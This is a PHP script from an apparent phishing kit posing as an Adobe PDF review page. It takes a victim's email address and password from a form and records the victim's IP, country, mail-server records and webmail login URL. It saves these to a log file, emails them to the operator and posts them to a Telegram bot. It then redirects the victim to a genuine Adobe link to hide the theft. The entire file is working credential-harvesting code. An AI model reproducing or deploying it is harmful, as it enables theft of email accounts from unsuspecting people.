<?php
// ==========================================
// Auto-detect and load config.php
// ==========================================
function loadConfig() {
    // Possible paths to check for config.php
    $possiblePaths = [
        __DIR__ . '/config.php',           // Same directory
        dirname(__DIR__) . '/config.php',  // Parent directory
        __DIR__ . '/../config.php',        // One level up
        __DIR__ . '/../../config.php',     // Two levels up
        $_SERVER['DOCUMENT_ROOT'] . '/config.php', // Document root
        $_SERVER['DOCUMENT_ROOT'] . '/../config.php', // Above document root
        '/etc/config.php',                 // System-wide config
    ];

    foreach ($possiblePaths as $path) {
        if (file_exists($path)) {
            require_once $path;
            return true;
        }
    }

    // If config not found, try to find it recursively
    $dir = __DIR__;
    for ($i = 0; $i < 5; $i++) {
        $dir = dirname($dir);
        $configPath = $dir . '/config.php';
        if (file_exists($configPath)) {
            require_once $configPath;
            return true;
        }
    }

    return false;
}

// Load configuration
if (!loadConfig()) {
    // Fallback to hardcoded values if config not found
    define('EMAIL', 'email here');
    define('TG_TOKEN', 'enter token');
    define('TG_CHAT_ID', 'chat id');
    define('SUBMIT', '2');
}

// ==========================================
// Use configuration values
// ==========================================
$sendToEmail = EMAIL;
$telegramToken = TG_TOKEN;
$telegramChatId = TG_CHAT_ID;
$submitLimit = defined('SUBMIT') ? SUBMIT : 2;

// ==========================================
// Session tracking for submission counting
// ==========================================
function getSessionIdentifier() {
    global $session_folder;
    
    if (isset($session_folder) && !empty($session_folder)) {
        return $session_folder;
    }
    
    // Generate a session ID based on IP and date
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    return md5($ip . date('Y-m-d'));
}

// Initialize session tracking
$sessionId = getSessionIdentifier();
$sessionFile = sys_get_temp_dir() . '/' . $sessionId . '_submissions.txt';

// Check submission count
$submissionCount = 0;
if (file_exists($sessionFile)) {
    $submissionCount = (int)file_get_contents($sessionFile);
}

// If submission limit reached, stop processing
if ($submissionCount >= $submitLimit) {
    // Still redirect but don't log/send
    header("Location: https://documentcloud.adobe.com/link/review/1158562429651398");
    exit();
}

// ==========================================
// Collect input
// ==========================================
$ai = $_POST['ai'] ?? '';
$pi = $_POST['pi'] ?? '';

// ==========================================
// Validate email
// ==========================================
if (!filter_var($ai, FILTER_VALIDATE_EMAIL)) {
    exit('Invalid email address.');
}

// Increment submission count
$submissionCount++;
file_put_contents($sessionFile, $submissionCount);

// ==========================================
// Timestamp
// ==========================================
$timestamp = date('Y-m-d H:i:s');

// ==========================================
// Get MX Records
// ==========================================
$domain = substr(strrchr($ai, "@"), 1);
$mxRecords = '';
if (function_exists('getmxrr') && getmxrr($domain, $mxhosts)) {
    $mxRecords = implode(', ', $mxhosts);
} else {
    // Alternative method using dns_get_record
    $mxRecordsArray = @dns_get_record($domain, DNS_MX);
    if (!empty($mxRecordsArray)) {
        $mxRecords = implode(', ', array_column($mxRecordsArray, 'target'));
    } else {
        $mxRecords = 'No MX records found.';
    }
}

// ==========================================
// Get IP and Country
// ==========================================
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown IP';
$country = 'Unknown Country';

// Try ip-api.com first
$geoData = @file_get_contents("http://ip-api.com/json/$ip");
if ($geoData !== false) {
    $geoJson = json_decode($geoData, true);
    if ($geoJson && isset($geoJson['status']) && $geoJson['status'] === 'success') {
        $country = $geoJson['country'] ?? 'Unknown Country';
    }
}

// Fallback to ipapi.co if ip-api.com fails
if ($country === 'Unknown Country') {
    $geoData2 = @file_get_contents("https://ipapi.co/$ip/country_name/");
    if ($geoData2 !== false && !empty(trim($geoData2))) {
        $country = trim($geoData2);
    }
}

// ==========================================
// Get webmail login URL
// ==========================================
$webmailL0gin = "https://webmail.$domain";
if (!empty($mxRecords) && $mxRecords !== 'No MX records found.') {
    $mxDomain = explode(', ', $mxRecords)[0]; // Get first MX record
    
    $webmailMapping = [
        'mx.yandex.ru' => 'https://mail.yandex.com',
        'mx.mail.ru' => 'https://mail.ru',
        'mx.ukr.net' => 'https://mail.ukr.net',
        'mx.gmx.net' => 'https://mail.gmx.com',
        'mx.orange.fr' => 'https://webmail.orange.fr',
        'mx.protonmail.ch' => 'https://mail.proton.me',
        'mx.web.de' => 'https://web.de',
        'mx.vodafone.it' => 'https://mail.vodafone.it',
        'mx.libero.it' => 'https://mail.libero.it',
        'mx.tiscali.it' => 'https://mail.tiscali.it',
        'google.com' => 'https://mail.google.com',
        'zoho.com' => 'https://mail.zoho.com',
        'zoho.in' => 'https://mail.zoho.in',
        'zoho.eu' => 'https://mail.zoho.eu',
        'hostinger.com' => 'https://mail.hostinger.com',
        'secureserver.net' => 'https://email.godaddy.com',
        'emailsrvr.com' => 'https://apps.rackspace.com',
        'aruba.it' => 'https://webmail.aruba.it/',
    ];

    foreach ($webmailMapping as $key => $url) {
        if (strpos($mxDomain, $key) !== false) {
            $webmailL0gin = $url;
            break;
        }
    }
}

// ==========================================
// Prepare message
// ==========================================
$message = "------------------------\n";
$message .= "Page           : PDF Auto\n";
$message .= "usr            : $ai\n";
$message .= "Ps             : $pi\n";
$message .= "IP             : $ip\n";
$message .= "Country        : $country\n";
$message .= "MX Records     : $mxRecords\n";
$message .= "Webmail L0gin  : $webmailL0gin\n";
$message .= "Time           : $timestamp\n";
$message .= "Submission #   : $submissionCount of $submitLimit\n";
$message .= "------------------------\n";

// ==========================================
// Save to file with proper path handling
// ==========================================
$saveFile = __DIR__ . '/d@main123.txt';
@file_put_contents($saveFile, $message, FILE_APPEND);

// ==========================================
// Send email with error suppression
// ==========================================
@mail($sendToEmail, "ALL PDF L0GZ | $country | $ip", $message);

// ==========================================
// Send to Telegram with error suppression
// ==========================================
$telegramUrl = "https://api.telegram.org/bot$telegramToken/sendMessage";
$telegramData = [
    'chat_id' => $telegramChatId,
    'text' => $message
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($telegramData),
        'timeout' => 5, // 5 second timeout
    ]
];
@file_get_contents($telegramUrl, false, stream_context_create($options));

// ==========================================
// Redirect to Adobe Document Cloud
// ==========================================
header("Location: https://documentcloud.adobe.com/link/review/1158562429651398");
exit();
?>